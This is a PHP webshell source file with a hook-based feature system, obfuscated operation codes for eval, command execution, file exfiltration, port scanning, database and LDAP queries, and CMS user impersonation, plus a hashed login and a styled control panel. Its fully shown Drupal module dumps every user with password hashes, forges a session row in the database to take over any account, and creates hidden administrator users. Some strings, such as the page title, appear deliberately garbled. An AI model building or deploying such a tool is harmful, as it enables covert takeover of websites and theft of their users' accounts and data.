<?php

// section.functions

/**
 * Hooks container
 */
$hooks = array(
    // Hooks that are called directly before any page is rendered, useful to enforce authentication and similar
    "page_generation" => array(),
    // Hooks that are called to add isolated operations, isolated operations are operations that must be run in an
    // isolated environment meaning no other content should be rendered on the page except the operation result.
    // Example: file download, redirects, etc.
    "isolated_ops"    => array(),
    // Hooks that are called to add register features to the webshell
    "features"        => array(),
    // Named hooks that are called to render a page, ONLY the first matching hook is called.
    // This is a named array (aka object) => [hook_name => function1, hook_name => function2, ...]
    "GET_page"        => array(),
    // Named hooks that are called to handle a POST request, ONLY the first matching hook is called.
    // This is a named array (aka object) => [hook_name => function1, hook_name => function2, ...]
    "POST_operation"  => array(),
);

/**
 * Register a hook
 *
 * @param $hook string The hook to register
 * @param $function string|array The function to call or call_user_func compatible array
 *
 * @return void
 */
function add_hook($hook, $function) {
    global $hooks;

    $hooks[$hook][] = $function;
}

/**
 * Register a named hook
 *
 * @param $hook string The hook to register
 * @param $name string The name of the hook
 * @param $function string|array The function to call or call_user_func compatible array
 *
 * @return void
 */
function add_named_hook($hook, $name, $function) {
    global $hooks;

    // If the hook is already registered any new registration is ignored
    if (!empty($hooks[$hook][$name])) {
        return;
    }

    $hooks[$hook][$name] = $function;
}

/**
 * Call a hook
 *
 * @param $hook string The hook to call
 * @param $arguments array The arguments to pass to the hook (by reference)
 *
 * @return void
 */
function call_hook($hook, &$arguments = array()) {
    global $hooks;

    foreach ($hooks[$hook] as $function) {
        call_user_func_array($function, $arguments);
    }
}

/**
 * Call a named hook
 *
 * @param $hook string The hook to call
 * @param $name string The name of the hook
 * @param $arguments array The arguments to pass to the hook (by reference)
 *
 * @return void
 */
function call_named_hook($hook, $name, &$arguments = array()) {
    global $hooks;

    // If the hook is not registered, fail silently
    if (empty($hooks[$hook][$name])) {
        return;
    }

    call_user_func_array($hooks[$hook][$name], $arguments);
}

// section.functions.end


$IMPERSONATE_DRUPAL_USER = "m49";


$CHECK_DRUPAL_USER_ROLES = "z44";


$IMPERSONATE_JOOMLA_USER = "y78";


$IMPERSONATE_WP_USER = "V62";


$EVAL = "Z42";


$DIRECTORY_LISTING = "E84";


$EXFILTRATE = "G44";


$FILE_EXTRACTION         = "T89";
$FILE_EXTRACTION_PREVIEW = "b08";


$WRITE_FILE = "z22";


$LOGIN    = "B68";
$USERNAME = "94ecbfda8301da35cfcd9ebc335d4146b2b282a331dd7d10f5c0cac2a4f59d1d463dfd2ce5357cb2e182d06e0b8b4143de7ca7cccb397ebe82b11c99ab1a8deb";
$PASSWORD = "8f132ecd20609aaed7a7e296e829a4c36718b4c496ff939e2e3e370fca6bd7a0ff6513697e7b95ca84d62ca2bed6562ab031d53eb9455e26c8222021e3b935ef";
$SALT     = '9+.EM5?5@675^-f4>Fs6L1?Cjl550j71]!1&344Z;_knY7;Y$0_Tx??K2d&F[,&v';


$PHP_INFO = "Q25";


$PORT_SCAN = "Z35";


$QUERY_DATABASES = "f20";


$QUERY_LDAP = "E43";


$RUN_COMMAND = "a32";

// inject: <?php

/**
 * Check if the request method is POST
 *
 * @return bool
 */
function NisPost() {
    return $_SERVER['REQUEST_METHOD'] === 'POST';
}

/**
 * Load the page or get the fallback page
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return mixed
 */
function NloadPageOrDefault($features) {
    return isset($_GET['page']) ? $_GET['page'] : $features[0]["op"];
}

/**
 * Render the page content by calling the named hook for the current page
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The page to render
 *
 * @return void
 */
function NrenderPage($features, $page) {
    global $css;
    // Load the page content by calling the named hook for the current page
    $content = "";
    $args    = array(&$content, $features, $page, $css);
    call_named_hook("GET_page", $page, $args);

    // Render the page content
    echo $content;
}

/**
 * Check if the operation is in the isolated operations list
 *
 * @param $operation string The operation to check
 * @param $isolated_ops array The isolated operations list
 *
 * @return bool
 */
function NisIsolatedOperation($operation, $isolated_ops) {
    return in_array($operation, $isolated_ops);
}

/**
 * Open the command output screen where output can be freely written
 *
 * @param bool $capture_output Whether to capture the output or not
 * @param string $classes Classes to apply to the command output screen
 * @param string $title Title of the command output screen
 * @param bool $no_margin Whether to remove the margin from the command output screen
 * @param bool $no_padding Whether to remove the padding from the command output screen
 *
 * @return void|string Returns the output if $capture_output is true
 */
function NopenCommandOutputScreen(
    $capture_output = false,
    $classes = "",
    $title = "Command output",
    $no_margin = false,
    $no_padding = false
) {
    if ($capture_output) {
        ob_start();
    }

    ?>
    <div class="<?php
    echo $no_margin ? "" : "ml-72 ";
    echo $no_padding ? "" : "py-10 ";
    ?>">
    <div class="container px-16">
    <div class="bg-zinc-900 font-mono text-sm overflow-auto rounded shadow-md text-white px-6 py-3">
    <h3 class="border-b border-zinc-700 text-sm font-semibold leading-8">
        <?= htmlentities($title) ?>
    </h3>
    <pre class="p-2 mt-2 <?= htmlentities($classes) ?>"><?php

    if ($capture_output) {
        return ob_get_clean();
    }
}

/**
 * Closes the command output screen
 *
 * @param bool $capture_output Whether to capture the output or not
 *
 * @return void|string Returns the output if $capture_output is true
 */
function NcloseCommandOutputScreen($capture_output = false) {
    if ($capture_output) {
        ob_start();
    }

    ?></pre>
    </div>
    </div>
    </div>
    <?php

    if ($capture_output) {
        return ob_get_clean();
    }
}

/**
 * Create a page with the given elements
 *
 * @param $enabled_features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The
 *     features container
 * @param $css string CSS to include in the page
 * @param $current_page string Current page to highlight in the navigation
 * @param $elements string[] Elements to include in the page
 *
 * @return string
 */
function NmakePage($enabled_features, $css, $current_page, $elements) {
    $args = array(&$elements, $current_page, $css);
    call_hook("page_generation", $args);

    ob_start();
    ?>
    <html lang="en">
    <head>
        <title>=wI/v</title>
        <style><?= $css ?></style>
        <script>u5
            ]^
            1</script>
    </head>
    <body class="bg-white">
    <div class="fixed inset-y-0 z-50 w-72 flex flex-col">
        <div class="flex flex-grow flex-col gap-y-5 overflow-y-auto bg-zinc-900 px-6 pb-4">
            <div class="flex items-center h-16 shrink-0">
                <h1 class="text-2xl text-white">=wI/v</h1>
            </div>
            <nav class="flex flex-1 flex-col">
                <ul role="list" class="flex flex-1 flex-col gap-y-7">
                    <li>
                        <ul role="list" class="-mx-2">
                            <?php
                            foreach ($enabled_features as $feature => $definition) {
                                echo NmakeNavLink($feature, $current_page, $definition);
                            }
                            ?>
                        </ul>
                    </li>
                </ul>
            </nav>
        </div>
    </div>
    <div class="ml-72">
        <main class="py-10">
            <div class="container px-16">
                <?php
                foreach ($elements as $element) {
                    echo $element;
                }
                ?>
            </div>
        </main>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create a navigation link
 *
 * @param $page string Page to link to
 * @param $current_page string Current page to highlight
 * @param $definition array{title: string, description: string, svg: string, hidden?: bool, op: string} Nav item
 *     definition
 *
 * @return string
 */
function NmakeNavLink($page, $current_page, $definition) {
    if ($definition["hidden"]) {
        return "";
    }

    ob_start();
    ?>
    <li>
        <a href="?page=<?= urlencode($definition["op"]) ?>"
           class="flex gap-x-3 rounded p-2 text-sm font-semibold leading-6
           <?= NhtmlHighlightActivePage($current_page, $definition["op"]) ?>
           "
           id="nav-<?= $definition["op"] ?>"
        >
            <div class="flex items-center justify-center">
                <?= $definition["svg"] ?>
            </div>
            <?= htmlentities($definition["title"]) ?>
        </a>
    </li>
    <?php
    return ob_get_clean();
}

/**
 * Returns the classes to apply to the navigation item highlighted because it's the current page
 *
 * @param $current_page string Current page
 * @param $checking_page string Page to check if it's the current page
 *
 * @return string
 */
function NhtmlHighlightActivePage($current_page, $checking_page) {
    if ($current_page === $checking_page) {
        return "bg-zinc-800 text-white";
    }
    return "text-zinc-400";
}

/**
 * Format bytes to human-readable format
 *
 * @param $bytes array|int|float Bytes to format
 *
 * @return string
 */
function NformatBytes($bytes) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');

    $bytes = max($bytes, 0);
    $pow   = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow   = min($pow, count($units) - 1);

    // Calculate size in the chosen unit
    $bytes /= pow(1024, $pow);

    // Format with three-point precision
    return Npad_right(round($bytes, 3) . ' ' . $units[$pow]);
}

/**
 * Download a file in chunks
 *
 * @param $filepath string Path to the file to download
 * @param $filesize int Size of the file
 * @param $filename string|null Name of the file to download or null to use the original filename
 *
 * @return void
 */
function NchunkedDownload($filepath, $filesize, $filename = null) {
    $chunk_size = 4096; // Adjust chunk size as needed

    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header(
        'Content-Disposition: attachment; filename="' .
        (!empty($filename) ? $filename : basename($filepath)) // Use the original filename if not provided
        . '"'
    );
    header('Content-Transfer-Encoding: chunked');
    header('Content-Length: ' . $filesize); // Set content length for progress tracking

    $file_handle = fopen($filepath, 'rb');

    while (!feof($file_handle)) {
        $chunk = fread($file_handle, $chunk_size);
        echo $chunk;
        flush();     // Flush output buffer after sending each chunk
    }

    fclose($file_handle);
}

/**
 * Create a code highlight element
 *
 * @param $code float|int|string Code to highlight
 *
 * @return string
 */
function NmakeCodeHighlight($code) {
    ob_start();
    ?>
    <code class="font-mono bg-zinc-100 text-zinc-900 text-sm px-2 py-1 rounded mx-1 select-all">
        <?= htmlentities($code) ?>
    </code>
    <?php
    return ob_get_clean();
}

/**
 * Pad a string to the left with spaces
 *
 * @param $str string String to pad
 * @param $pad_length int Length to pad to
 *
 * @return string
 */
function Npad_right($str, $pad_length = 10) {
    // Ensure string and pad length are valid
    if (!is_string($str) || !is_int($pad_length) || $pad_length <= 0) {
        return $str; // Return unmodified string for invalid input
    }

    // Pad the string with spaces using str_pad
    return str_pad($str, $pad_length);
}

/**
 * Convert a Unix timestamp to a date string
 *
 * @param $timestamp int Unix timestamp
 *
 * @return string
 */
function NconvertUnixTimestampToDate($timestamp) {
    return date('Y-m-d H:i:s', $timestamp);
}

/**
 * Create a page header
 *
 * @param $title string Title of the page
 * @param $description string Description of the page
 *
 * @return string
 */
function NmakePageHeader($title, $description) {
    ob_start();
    ?>
    <div class="lg:flex lg:items-center lg:justify-between">
        <div class="min-w-0 flex-1">
            <h2 class="text-2xl font-bold leading-7 text-zinc-900 sm:truncate sm:text-3xl sm:tracking-tight">
                <?= htmlentities($title) ?>
            </h2>
            <div class="mt-1 flex flex-col sm:mt-0 sm:flex-row sm:flex-wrap sm:space-x-6">
                <div class="mt-2 flex items-center text-sm text-zinc-500">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
                         stroke-width="1.5" stroke="currentColor"
                         class="mr-1.5 h-5 w-5 flex-shrink-0 text-zinc-400">
                        <path stroke-linecap="round" stroke-linejoin="round"
                              d="m11.25 11.25.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z"/>
                    </svg>
                    <?= $description ?>
                </div>
            </div>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create a form with the given elements
 *
 * @param $operation string Operation to perform when the form is submitted
 * @param $action string Action to perform when the form is submitted
 * @param $elements string[] Elements to include in the form
 * @param $method string Method to use for the form, default is "post"
 *
 * @return string
 */
function NmakeForm(
    $operation,
    $action,
    $elements,
    $method = "post",
    $submit_label = "Run operation",
    $classes = "flex flex-col gap-y-6 max-w-xl mt-8"
) {
    ob_start();
    ?>
    <form action="<?= $action ?>" method="<?= htmlentities($method) ?>"
          class="<?= htmlentities($classes) ?>">
        <input type="hidden" name="i94" value="<?= htmlentities($operation) ?>"/>
        <?php
        foreach ($elements as $element) {
            echo $element;
        }
        ?>
        <button type="submit"
                class="rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
                       hover:bg-zinc-700 transition-all duration-300">
            <?= htmlentities($submit_label) ?>
        </button>
    </form>
    <?php
    return ob_get_clean();
}

/**
 * Create an input field
 *
 * @param $type string Type of the input
 * @param $label string Label for the input
 * @param $name string Name of the input
 * @param $placeholder string Placeholder for the input
 * @param $description string Description of the input
 * @param $required bool Whether is the input required
 *
 * @return string
 */
function NmakeInput(
    $type,
    $label,
    $name,
    $placeholder,
    $description,
    $required = false,
    $query_param = null,
    $value = null
) {
    $name = htmlentities($name);

    ob_start();
    if ($type !== "textarea") {
        ?>
        <div class="flex flex-col gap-y-2 <?= $type === "hidden" ? "hidden" : ""; ?>"
             id="<?= $name ?>-container">
            <label for="<?= $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
                <?= htmlentities($label) ?>
                <?php
                if ($required) {
                    echo "<sup class='text-red-500'>*</sup>";
                }
                ?>
            </label>
            <input type="<?= htmlentities($type) ?>"
                   id="<?= $name ?>"
                   name="<?= $name ?>"
                   placeholder="<?= htmlentities($placeholder) ?>"
                <?php
                if ($required) {
                    echo "required ";
                }
                if (!empty($query_param)) {
                    echo "value=\"" . htmlentities($_GET[$query_param]) . "\" ";
                }
                elseif (!empty($value)) {
                    echo "value=\"" . htmlentities($value) . "\" ";
                }
                ?>
                   class="block w-full border-0 rounded py-1.5 text-zinc-900 shadow ring-1 ring-inset ring-zinc-300 focus:ring-indigo-600 placeholder-zinc-400">
            <p class="text-sm text-zinc-500">
                <?= $description ?>
            </p>
        </div>
        <?php
    }
    else {
        ?>
        <div class="flex flex-col gap-y-2" id="<?= $name ?>-container">
            <label for="<?= $name ?>" class="block text-sm font-medium leading-6 text-zinc-900">
                <?= $label ?>
                <?php
                if ($required) {
                    echo "<sup class='text-red-500'>*</sup>";
                }
                ?>
            </label>
            <textarea id="<?= $name ?>"
                      name="<?= $name ?>"
                      placeholder="<?= htmlentities($placeholder) ?>"
                <?php
                if ($required) {
                    echo "required";
                }
                ?>
                      class="block w-full border-0 rounded py-1.5 text-zinc-900 shadow ring-1 ring-inset ring-zinc-300 focus:ring-indigo-600 placeholder-zinc-400"
                      rows="5"
            ><?php
                if (!empty($value)) {
                    echo htmlentities($value);
                }
                ?></textarea>
            <p class="text-sm text-zinc-500">
                <?= $description ?>
            </p>
        </div>
        <?php
    }
    return ob_get_clean();
}

/**
 * Create a select field
 *
 * @param $label string Label for the select
 * @param $name string Name of the select
 * @param $options array<{label: string, value: string, disabled?: bool, selected?: bool}> Options for the select
 * @param $required bool Whether the select is required
 * @param $disable_reason string|null Reason for the option to be disabled, if any
 *
 * @return string
 */
function NmakeSelect($label, $name, $options, $required = false, $disable_reason = null) {
    $name = htmlentities($name);

    ob_start();
    ?>
    <div id="<?= $name ?>-container">
        <label for="<?= $name ?>" class="block text-sm font-medium leading-6 text-gray-900">
            <?= $label ?>
            <?php
            if ($required) {
                echo "<sup class='text-red-500'>*</sup>";
            }
            ?>
        </label>
        <select id="<?= $name ?>" name="<?= $name ?>"
                class="mt-2 block w-full rounded-md border-0 py-1.5 pl-3 pr-10 text-gray-900 ring-1 ring-inset
                ring-gray-300 focus:ring-2 focus:ring-indigo-600 sm:text-sm sm:leading-6"
            <?php
            if ($required) {
                echo "required ";
            }
            ?>
        >
            <?php
            foreach ($options as $option) {
                echo "<option value='" . htmlentities($option["value"]) . "' " .
                     ($option["disabled"] ? "disabled " : "") .
                     ($option["selected"] ? "selected " : "") .
                     ">" .
                     htmlentities($option["label"]) .
                     ($option["disabled"] && !empty($disable_reason) ? " - " . htmlentities($disable_reason) : "") .
                     "</option>";
            }
            ?>
        </select>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create a checkbox field
 *
 * @param $name string Name of the checkbox
 * @param $label string Label for the checkbox
 * @param $description string Description of the checkbox
 * @param $is_checked bool Whether the checkbox is checked
 * @param $value string Value of the checkbox, default is "y"
 * @param $onclick string|null OnClick event for the checkbox
 *
 * @return string
 */
function NmakeCheckbox($name, $label, $description, $is_checked = false, $value = "y", $onclick = null) {
    $name = htmlentities($name);

    ob_start();
    ?>
    <div class="relative flex items-start" id="<?= $name ?>-container">
        <div class="flex h-6 items-center">
            <input id="<?= $name ?>" name="<?= $name ?>" type="checkbox"
                   class="h-4 w-4 text-indigo-600 border-zinc-300 rounded focus:ring-indigo-600 "
                   value="<?= htmlentities($value) ?>"
                <?php
                if ($is_checked) {
                    echo "checked ";
                }
                if ($onclick !== null) {
                    echo "onclick=\"$onclick\" ";
                }
                ?>
            >
        </div>
        <div class="ml-3 text-sm leading-6 flex flex-col select-none">
            <label for="<?= $name ?>" class="font-medium text-zinc-900 w-full cursor-pointer">
                <?= htmlentities($label) ?>
            </label>
            <p class="text-zinc-500 cursor-pointer" onclick="document.getElementById('<?= $name ?>').click()">
                <?= $description ?>
            </p>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Check if the checkbox is active
 *
 * @param $name string Name of the checkbox
 *
 * @return bool
 */
function NisCheckboxActive($name) {
    return isset($_POST[$name]) && $_POST[$name] === "y";
}

/**
 * Array column function Nfor PHP < 5.5
 *
 * @param $array array Array to extract the column from
 * @param $column_name string Column name to extract
 *
 * @return array Extracted column
 */
function Narray_column($array, $column_name) {
    return array_map(function ($element) use ($column_name) { return $element[$column_name]; }, $array);
}

/**
 * Print an ASCII table from the given data
 *
 * @param $data array[] Data to print
 *
 * @return void
 */
function NprintAsciiTable($data) {
    // Get column headers
    $headers = array_keys($data[0]);

    // Calculate column widths
    $columnWidths = array();
    foreach ($headers as $header) {
        $columnWidths[$header] = max(array_map('strlen', Narray_column($data, $header))) + 2;
    }

    // Print top row
    echo "+";
    foreach ($headers as $header) {
        echo str_repeat("-", $columnWidths[$header]);
        echo "+";
    }
    echo PHP_EOL;

    // Print header row
    echo "|";
    foreach ($headers as $header) {
        printf("%-{$columnWidths[$header]}s|", htmlentities($header));
    }
    echo PHP_EOL;

    // Print divider row
    echo "+";
    foreach ($headers as $header) {
        echo str_repeat("-", $columnWidths[$header]);
        echo "+";
    }
    echo PHP_EOL;

    // Print table rows
    foreach ($data as $row) {
        echo "|";
        foreach ($row as $key => $value) {
            printf("%-{$columnWidths[$key]}s|", htmlentities($value));
        }
        echo PHP_EOL;
    }

    // Print bottom row
    echo "+";
    foreach ($headers as $header) {
        echo str_repeat("-", $columnWidths[$header]);
        echo "+";
    }
    echo PHP_EOL;
}

/**
 * Create an alert element on the page
 *
 * @param $title string Title of the alert box
 * @param $message string Message of the alert
 *
 * @return string
 */
function NmakeAlert($title, $message) {
    ob_start();
    ?>
    <div class="bg-yellow-100 border-l-4 border-yellow-500 p-4 rounded mt-4 text-zinc-900 flex gap-x-4">
        <div class="flex items-start justify-center text-yellow-600">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5"
                 stroke="currentColor" class="w-8 h-8">
                <path stroke-linecap="round" stroke-linejoin="round"
                      d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126ZM12 15.75h.007v.008H12v-.008Z"/>
            </svg>
        </div>
        <div class="flex flex-col">
            <h3 class="text-sm leading-7 font-semibold">
                <?= htmlentities($title) ?>
            </h3>
            <p class="text-sm">
                <?= $message ?>
            </p>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create a table element on the page
 *
 * @param $title string Title of the table
 * @param $description string Description of the table
 * @param $rows array[] Rows to display in the table
 * @param $columns string[]|null Columns to display in the table
 *
 * @return string
 */
function NmakeTable($title, $description, $rows, $columns = null, $action_form = null) {
    $columns = $columns ?: array_keys($rows[0]);
    ob_start();
    ?>
    <div class="px-4 sm:px-6 lg:px-8 mt-8">
        <div class="sm:flex sm:items-center">
            <div class="sm:flex-auto">
                <h1 class="text-base font-semibold leading-6 text-gray-900"><?= $title; ?></h1>
                <p class="mt-2 text-sm text-gray-700"><?= $description; ?></p>
            </div>
            <div class="mt-4 sm:ml-16 sm:mt-0 sm:flex-none">
                <?php
                if ($action_form !== null) {
                    echo $action_form;
                }
                ?>
            </div>
        </div>
        <div class="mt-8 flow-root">
            <div class="-mx-4 -my-2 overflow-x-auto sm:-mx-6 lg:-mx-8">
                <div class="inline-block min-w-full py-2 align-middle sm:px-6 lg:px-8">
                    <div class="overflow-hidden shadow ring-1 ring-black ring-opacity-5 sm:rounded-lg">
                        <table class="min-w-full divide-y divide-gray-300">
                            <thead class="bg-gray-50">
                            <tr>
                                <?php
                                foreach ($columns as $column) {
                                    echo "<th scope='col' class='px-3 py-3.5 text-left text-sm font-semibold text-gray-900'>$column</th>";
                                }
                                ?>
                            </tr>
                            </thead>
                            <tbody class="divide-y divide-gray-200 bg-white">
                            <?php
                            foreach ($rows as $row) {
                                echo "<tr>";
                                foreach ($columns as $key => $column) {
                                    if (is_array($row[$key])) {
                                        echo "<td class='whitespace-nowrap px-3 py-4 text-sm text-gray-500'>" .
                                             implode(", ", $row[$key]) .
                                             "</td>";
                                    }
                                    else {
                                        echo "<td class='whitespace-nowrap px-3 py-4 text-sm text-gray-500'>$row[$key]</td>";
                                    }
                                }
                                echo "</tr>";
                            }
                            ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <?php
    return ob_get_clean();
}

/**
 * Create the example page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function NmakeDrupalImpersonatePage(&$page_content, $features, $page, $css) {
    $feature = array_values(
        array_filter(
            $features,
            function ($feature) use ($page) {
                return $feature["op"] === $page;
            }
        )
    );

    $users        = NgetDrupalUsers();
    $page_content = NmakePage(
        $features,
        $css,
        $page,
        array(
            NmakePageHeader(
                $feature[0]["title"],
                $feature[0]["description"]
            ),
            NmakeTable(
                "Users",
                "Drupal users to impersonate",
                $users,
                array(
                    "username" => "Username",
                    "email"    => "Email",
                    "active"   => "Active",
                    "blocked"  => "Blocked",
                    "roles"    => "Roles",
                    "actions"  => "Actions",
                ),
                "
                        <dialog id='create-drupal-user' class='p-4 rounded w-1/3'>" .
                NmakeForm(
                    $page,
                    $_SERVER["REQUEST_URI"],
                    array(
                        "<div class='flex items-center justify-between'>
                            <h3 class='text-lg font-semibold text-zinc-800'>Create Drupal user</h3>
                            <button onclick='document.getElementById(\"create-drupal-user\").close(); document.getElementById(\"create-drupal-user\").classList.remove(\"flex\")' 
                                class='text-zinc-800 hover:text-zinc-700 transition-all duration-300 text-2xl'>
                                &times;
                            </button>
                        </div>",
                        NmakeInput(
                            "text",
                            "Username",
                            "x45",
                            "admin",
                            "Username of the user to create.",
                            true
                        ),
                        NmakeInput(
                            "text",
                            "Email",
                            "O29",
                            "admin@example.com",
                            "Email of the user to create.",
                            true
                        ),
                        NmakeInput(
                            "password",
                            "Password",
                            "t14",
                            "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
                            "Password of the user to create.",
                            true
                        ),
                    ),
                    "post",
                    "Create user",
                    "flex flex-col gap-y-6 mx-auto w-full"
                )
                . "
                    </dialog>
                    <button onclick='document.getElementById(\"create-drupal-user\").showModal()' 
                        class='rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
                            hover:bg-zinc-700 transition-all duration-300'>
                        Create user
                    </button>"
            ),
        )
    );
}

/**
 * Lists all Drupal users
 */
function NgetDrupalUsers() {
    global $IMPERSONATE_DRUPAL_USER;

    if (!class_exists("Drupal\user\Entity\Role") || !class_exists("Drupal\user\Entity\User") ||
        !class_exists("Drupal")) {
        return array();
    }

    // Load all user roles.
    $roles = \Drupal\user\Entity\Role::loadMultiple();
    // Get all permissions.
    $permissions = \Drupal::service('user.permissions')
        ->getPermissions();

    // Get a list of all users.
    $query = \Drupal::entityQuery('user')
        ->accessCheck(false);
    $uids  = $query->execute();

    // Load user entities.
    $users = \Drupal\user\Entity\User::loadMultiple($uids);

    $result = array();

    // Iterate through each user.
    foreach ($users as $user) {
        $partial_result = array();

        $username                   = $user->getAccountName();
        $partial_result["username"] = empty($username) ? "Anonymous" : $username;
        $partial_result["id"]       = $user->id();
        $partial_result["email"]    = $user->getEmail();
        $partial_result["active"]   = $user->isActive() ? "Yes" : "No";
        $partial_result["blocked"]  = $user->isBlocked() ? "Yes" : "No";
        $partial_result["uuid"]     = $user->uuid();
        $partial_result["password"] = $user->getPassword();
        $partial_result["actions"]  = !empty($username)
            ? NmakeForm(
                $IMPERSONATE_DRUPAL_USER,
                $_SERVER["REQUEST_URI"],
                array(
                    NmakeInput(
                        "hidden",
                        "Username",
                        "c69",
                        "",
                        "Username of the user to impersonate.",
                        true,
                        null,
                        $partial_result["id"]
                    ),
                ),
                "post",
                "Impersonate",
                "flex flex-col max-w-xl mb-0"
            )
            : "";

        // Get assigned roles for the user.
        $user_roles              = $user->getRoles();
        $partial_result["roles"] = implode(", ", $user_roles);

        $result[] = $partial_result;
    }

    return $result;
}

/**
 * Impersonate a Drupal user
 *
 * @param $username string Username of the user to impersonate
 */
function NimpersonateDrupalUser($id) {
    if (!class_exists("Drupal\user\Entity\User") || !class_exists("Drupal") ||
        !class_exists("Drupal\Component\Utility\Crypt")) {
        if (!class_exists("Symfony\Component\HttpFoundation\RedirectResponse")) {
            header("Location: " . $_SERVER['REQUEST_URI']);
            return;
        }

        return new \Symfony\Component\HttpFoundation\RedirectResponse($_SERVER['REQUEST_URI']);
    }

    // Load the user by username.
    $user = \Drupal\user\Entity\User::load($id);

    // Check if the user exists.
    if ($user) {
        $database = \Drupal::database();

        $auth           = true;
        $sf2_meta       = array(
            // session timestamp
            "u" => time(),
            // login timestamp as from user_field_data
            "c" => time(),
            // max session lifetime as per core.services.yml
            "l" => 2000000,
            // csrf token seed - set via Crypt::randomBytesBase64()
            "s" => \Drupal\Component\Utility\Crypt::randomBytesBase64(),
        );
        $sf2_attributes = array(
            "uid" => "$id",
        );

        $prefix = $database->getPrefix();

        $forged_session = "auth|" .
                          serialize($auth) .
                          "_sf2_meta|" .
                          serialize($sf2_meta) .
                          "_sf2_attributes|" .
                          serialize($sf2_attributes);

        try {
            $database->query(
                "update {$prefix}sessions as s set s.session=:a, timestamp=:b, uid=:c where sid=:d",
                array(
                    ":a" => $forged_session,
                    ":b" => $sf2_meta['u'],
                    ":c" => $id,
                    ":d" => \Drupal\Component\Utility\Crypt::hashBase64(session_id()),
                )
            )
                ->execute();
        }
        catch (Exception $e) {
            // Uncaught exception as for some reason it fail also when the query executes successfully
        }

        // Set the authenticated user
        Drupal::currentUser()
            ->setAccount($user);
    }

    return new \Symfony\Component\HttpFoundation\RedirectResponse('/admin');
}

/**
 * Adds a Drupal administrator user.
 *
 * @param $username string The username of the new user.
 * @param $email string The email address of the new user.
 * @param $password string The password for the new user.
 */
function NaddDrupalAdministratorUser($username, $email, $password) {
    if (!class_exists("Drupal\user\Entity\Role") || !class_exists("Drupal\user\Entity\User") ||
        !class_exists("Drupal")) {
        return;
    }

    // Load the user roles.
    $roles = \Drupal\user\Entity\Role::loadMultiple();

    // Define the roles for the administrator user.
    $administrator_roles = array(
        'administrator',
    );

    // Create a new user entity.
    $user = \Drupal\user\Entity\User::create();

    // Set the username, email, and password.
    $user->setUsername($username);
    $user->setEmail($email);
    $user->setPassword($password);

    // Set the user status to active.
    $user->activate();

    // Assign roles to the user.
    foreach ($administrator_roles as $role) {
        if (isset($roles[$role])) {
            $user->addRole($role);
        }
    }

    // Save the user.
    $user->save();
}

/**
 * Handle the login operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return mixed
 */
function NhandleDrupalImpersonate($operation, $features) {
    if (!empty($_POST["c69"])) {
        return NimpersonateDrupalUser($_POST["c69"]);
    }
    elseif (!empty($_POST["x45"]) &&
            !empty($_POST["O29"]) &&
            !empty($_POST["t14"])) {
        NaddDrupalAdministratorUser(
            $_POST["x45"],
            $_POST["O29"],
            $_POST["t14"]
        );

        if (!class_exists("Symfony\Component\HttpFoundation\RedirectResponse")) {
            header("Location: " . $_SERVER['REQUEST_URI']);
            return;
        }

        return new \Symfony\Component\HttpFoundation\RedirectResponse($_SERVER["REQUEST_URI"]);
    }
}

/**
 * Hook the isolated operations to add the current operation
 *
 * @param $isolated_ops array The isolated operations container
 *
 * @return void
 */
function NdrupalImpersonateHooksIsolatedOps(&$isolated_ops) {
    global $IMPERSONATE_DRUPAL_USER;

    $isolated_ops[] = $IMPERSONATE_DRUPAL_USER;
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NdrupalImpersonateHooksFeatures(&$features) {
    global $IMPERSONATE_DRUPAL_USER;

    $features[] = array(
        "title"       => "Impersonate Drupal user",
        "description" => "Impersonate a Drupal user by changing the current session.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z" />
</svg>',
        "op"          => $IMPERSONATE_DRUPAL_USER,
    );
}

